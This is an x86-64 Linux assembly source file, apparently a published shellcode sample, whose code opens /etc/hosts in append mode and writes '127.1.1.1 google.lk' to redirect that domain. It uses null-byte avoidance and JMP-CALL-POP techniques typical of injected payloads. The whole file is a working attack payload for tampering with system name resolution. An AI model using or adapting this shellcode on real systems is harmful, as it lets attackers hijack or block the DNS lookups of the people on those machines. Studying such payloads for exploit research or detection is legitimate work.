; File: shellcode-896.nasm
; Author: Osanda Malith Jayathissa

global _start

section .text

_start:

    ; open
    xor rax, rax
    add rax, 2                          ; syscall number 2, int open(const char *pathname, int flags)
    xor rdi, rdi                        ; RDI = 0
    xor rsi, rsi                        ; RSI = 0
    push rsi                            ; push zero qword
    mov r8, 0x2f2f2f2f6374652f          ; "////cte/"
    mov r10, 0x7374736f682f2f2f         ; "stsoh///"
    push r10
    push r8
    add rdi, rsp                        ; RDI points to "/etc//////hosts0x00"
    xor rsi, rsi                        ; not needed
    add si, 0x401                       ; RSI = 0x401, int flags = O_WRONLY|O_APPEND
    syscall 							; syscall number 2, open("/etc///hosts", O_WRONLY|O_APPEND)

    ; write
    xchg rax, rdi                       ; RDI = fd_num, RAX = pointer to "/etc//////hosts0x00"
    xor rax, rax
    add rax, 1                          ; syscall number 1, ssize_t write(int fd, const void *buf, size_t count)
    jmp data                            ; JMP-CALL-POP

write:

    pop rsi                             ; RSI = pointer to text variable, const void *buf
    mov dl, 19 ; length in rdx          ; RDX = 19, size_t count
    syscall                             ; invoke system call write(fd_num, "127.1.1.1 google.lk", 19)

    ; close
    xor rax, rax
    add rax, 3                          ; syscall number 3, int close(int fd)
    syscall                             ; invoke system call close(fd_num)

    ; exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi                        ; syscall number 60, void exit(int status)
    syscall                             ; invoke system call exit(0)

data:
    call write                          ; push pointer to text variable into the stack
    text db '127.1.1.1 google.lk'
